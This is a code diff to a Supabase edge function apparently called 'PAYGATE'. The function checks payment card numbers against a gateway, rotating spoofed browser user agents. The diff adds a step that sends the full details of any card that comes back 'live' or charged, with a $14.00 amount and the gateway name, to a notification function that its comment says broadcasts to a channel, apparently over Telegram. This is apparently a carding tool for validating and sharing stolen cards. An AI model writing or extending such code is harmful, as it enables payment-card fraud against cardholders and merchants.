@@ -13,6 +13,35 @@ const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;
 const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
 const ADMIN_CHAT_ID = "8496943061";
 
+// Notify charged card (fire-and-forget) - broadcasts to channel
+const notifyChargedCard = (
+  userId: string,
+  cardDetails: string,
+  status: "CHARGED" | "DECLINED" | "UNKNOWN",
+  responseMessage: string,
+  amount: string,
+  gateway: string
+) => {
+  const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
+  if (!SUPABASE_SERVICE_ROLE_KEY) return;
+
+  fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
+    },
+    body: JSON.stringify({
+      user_id: userId,
+      card_details: cardDetails,
+      status,
+      response_message: responseMessage,
+      amount,
+      gateway,
+    }),
+  }).catch((err) => console.error("[PAYGATE] notify-charged-card error:", err));
+};
+
 // Extended user agents with various browsers and versions
 const userAgents = [
   // Chrome Windows
@@ -366,7 +395,17 @@ serve(async (req) => {
     // Perform check with automatic retry for UNKNOWN responses
     const data = await performCheck(cc, userAgent);
 
-    // Admin debug for UNKNOWN results is disabled
+    // Broadcast CHARGED/LIVE cards to channel (fire-and-forget)
+    if (data.computedStatus === 'live') {
+      notifyChargedCard(
+        user.id,
+        cc,
+        'CHARGED',
+        String(data.responseMessage || 'CHARGED'),
+        '$14.00',
+        'PayGate'
+      );
+    }
 
     return new Response(
       JSON.stringify(data),
